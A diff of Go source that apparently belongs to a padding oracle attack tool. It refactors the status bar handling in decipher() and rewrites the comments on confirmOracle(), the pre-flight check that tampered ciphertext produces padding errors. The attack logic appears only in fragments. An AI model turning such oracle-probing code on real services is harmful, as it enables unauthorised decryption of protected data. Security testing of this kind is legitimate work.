@@ -1,14 +1,15 @@
 package main
 
+/* implementation of Padding Oracle exploit algorithm */
+
 import (
 	"context"
 	"fmt"
 )
 
 func decipher(cipherEncoded string) ([]byte, error) {
-	// we refer to current status
-	status := currentStatus
-	blockLen := *config.blockLen
+
+	blockLen := *config.blockLen //just a shortcut
 
 	/* usually we are given an initial, valid cipher, tampering on which, we discover the plaintext
 	we decode it into bytes, so we can tamper it at that byte level */
@@ -52,8 +53,8 @@ func decipher(cipherEncoded string) ([]byte, error) {
 	plainText := make([]byte, plainLen)
 
 	// init new status bar
-	status.openBar(plainLen)
-	defer status.closeBar()
+	currentStatus.openBar(plainLen)
+	defer currentStatus.closeBar()
 
 	// decode every cipher chunk and fill-in the relevant plaintext positions
 	// we move backwards through chunks, though it really doesn't matter
@@ -70,10 +71,12 @@ func decipher(cipherEncoded string) ([]byte, error) {
 	return plainText, nil
 }
 
+/* carry out pre-flight checks:
+1. confirm that original cipher is valid (does not produce padding error)
+2. confirm that tampered cipher produces padding error */
 func confirmOracle(cipher []byte) error {
 	status := currentStatus
-	/* carry out pre-flight checks:*/
-	//1. confirm that original cipher is valid (does not produce padding error)
+	/* one */
 	status.printAction("Confirming provided cipher is valid...")
 	e, err := isPaddingError(cipher, nil)
 	if err != nil {
@@ -83,15 +86,16 @@ func confirmOracle(cipher []byte) error {
 		return fmt.Errorf("Initial cipher produced padding error. It is not suitable therefore")
 	}
 
-	//2. confirm that tampered cipher produces padding error
+	/* two */
 	status.printAction("Cofirming padding oracle...")
 	tamperPos := len(cipher) - *config.blockLen - 1
 	originalByte := cipher[tamperPos]
 	defer func() { cipher[tamperPos] = originalByte }()
 
 	/* tamper last byte  of pre-last block twice, to avoid case when we hit another valid padding
-	e.g. original cipher ends with \x02\x01, if we only would use one try, we can (unlikely) hit into
-	ending \x02\x02 which is also a valid padding*/
+	e.g. if original cipher ends with \x02\x01,
+	then if we only would use one try, we can (unlikely) hit into ending \x02\x02 which is also a valid padding */
+
 	for i := 0; i <= 3; i++ {
 		// we can waste one try if hit original byte
 		if byte(i) == originalByte {
@@ -104,7 +108,6 @@ func confirmOracle(cipher []byte) error {
 			break
 		}
 	}
-
 	if err != nil {
 		return err
 	}
